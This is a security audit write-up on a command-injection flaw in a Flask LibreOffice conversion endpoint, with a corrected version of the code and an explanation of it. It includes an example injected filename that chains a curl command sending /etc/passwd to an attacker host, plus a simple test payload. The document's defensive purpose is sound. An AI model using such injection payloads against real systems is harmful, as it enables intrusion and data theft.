## Verdict

Confirmed. `convert_document()` builds a shell command string by interpolating an attacker-controlled `filename` value directly into it, then executes that string with `subprocess.run(command, shell=True, check=True)`. Because the value is not neutralized, an attacker can terminate the intended `libreoffice` invocation and append arbitrary shell commands.

## Source

`filename = request.form["filename"]` (line 14) — a POST form field submitted by the client, fully attacker-controlled. It flows unmodified into `input_path` (line 15) and into the `command` string (lines 18-21), which reaches the shell at the `subprocess.run(command, shell=True, check=True)` call on line 23.

Example payload: a `filename` of `report.docx; curl http://attacker.example/$(cat /etc/passwd) #` closes out the intended arguments and chains an arbitrary second command, which `/bin/sh -c` will happily execute because `shell=True` hands the whole interpolated string to a shell for parsing.

## Fix

```python
import os
import re
import subprocess

from flask import Flask, request, send_file, abort

app = Flask(__name__)

UPLOAD_DIR = "/var/data/uploads"
OUTPUT_DIR = "/var/data/converted"

_SAFE_FILENAME = re.compile(r"[\w.\-]+")


@app.route("/convert", methods=["POST"])
def convert_document():
    """Convert an uploaded document to PDF using the installed LibreOffice CLI."""
    filename = request.form["filename"]

    # Reject anything that isn't a bare filename (no separators, no traversal,
    # no shell metacharacters) before it touches the filesystem or a subprocess.
    if filename != os.path.basename(filename) or not _SAFE_FILENAME.fullmatch(filename):
        abort(400, "invalid filename")

    input_path = os.path.join(UPLOAD_DIR, filename)
    output_path = os.path.join(OUTPUT_DIR, f"{filename}.pdf")

    subprocess.run(
        [
            "libreoffice",
            "--headless",
            "--convert-to", "pdf",
            "--outdir", OUTPUT_DIR,
            input_path,
        ],
        shell=False,
        check=True,
    )

    return send_file(output_path)
```

## Explanation

The root cause is `shell=True` combined with an f-string-built command: it forces `subprocess` to hand the entire string to `/bin/sh -c`, which re-parses it and treats shell metacharacters (`;`, `|`, `&&`, backticks, `$()`, etc.) in `filename` as command syntax rather than as literal argument data. No amount of quoting the individual field reliably closes this off, because the attacker controls where the quoting boundary itself falls.

The fix removes the shell entirely: `subprocess.run` is called with `shell=False` (the default, made explicit here) and an explicit argument list. Each list element — including `input_path` — is passed directly to the `execve`-style process creation as one argument, so shell metacharacters inside `filename` are inert; they can only ever be literal characters within the `libreoffice` invocation's argument, never syntax that spawns a second command.

An argument list alone does not fully close the door, so two additional checks are layered in:

- **Path traversal / injection into the filesystem paths.** `filename` also feeds `input_path` and `output_path` via string interpolation. Without a check, a value like `../../etc/passwd` would let the handler read or write outside `UPLOAD_DIR`/`OUTPUT_DIR`. The `filename != os.path.basename(filename)` check rejects any value containing a path separator or `..` component, and `os.path.join` is used instead of manual interpolation.
- **Option/flag injection.** Even with an argument array, if `input_path` could be attacker-controlled to start with `-`, LibreOffice's argument parser could interpret it as a flag rather than a filename. Because `input_path` is always prefixed with the fixed `UPLOAD_DIR`, it can never itself start with `-`, so this is not exploitable here as long as the basename check above stays in place; the regex allowlist (`[\w.\-]+`) additionally constrains `filename` to a conservative, safe character set as defense in depth.

To verify the fix, confirm that a `filename` such as `test.docx; touch /tmp/pwned` is now rejected with a 400 response instead of reaching `subprocess.run`, and that a legitimate filename (e.g. `report.docx`) still converts successfully end to end.
